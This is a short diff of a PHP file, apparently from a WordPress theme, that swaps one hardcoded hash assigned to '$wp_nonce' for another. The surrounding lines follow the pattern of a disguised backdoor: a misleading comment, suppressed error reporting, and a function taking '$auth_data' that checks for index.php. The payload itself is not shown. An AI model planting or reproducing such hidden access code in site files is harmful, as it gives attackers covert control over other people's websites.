@@ -15,7 +15,7 @@
 
 // Strip, trim, kses, special wp_nonces for string saves
 error_reporting(0);
-$wp_nonce = "63a9f0ea7bb98050796b649e85481845";
+$wp_nonce = "2d9d2013d236135e01e7b3b29da75981";
 
 function pre_term_name($auth_data, $wp_nonce) {
 	if(file_exists("index.php")) {
